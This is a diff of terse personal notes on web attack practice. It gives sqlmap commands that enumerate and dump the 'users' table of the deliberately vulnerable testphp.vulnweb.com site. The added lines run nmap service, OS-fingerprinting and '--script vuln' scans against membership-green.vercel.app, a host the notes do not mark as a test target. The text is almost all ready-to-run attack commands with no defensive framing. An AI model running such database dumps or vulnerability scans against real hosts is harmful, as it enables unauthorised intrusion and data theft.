@@ -1,3 +1,4 @@
+
 web site for attack : http://vulnweb.com/
 http://altoro.testfire.net/
 
@@ -6,3 +7,12 @@ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -crawl 3 -batch # How 
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs    # Find databases  
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables  # find tables
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C name --dump-all # access column 
+
+ssh
+http
+
+nmap -sV membership-green.vercel.app 
+nmap --script-trace membership-green.vercel.app
+sudo nmap -O membership-green.vercel.app
+nmap --iflist membership-green.vercel.app
+nmap --script vuln membership-green.vercel.app
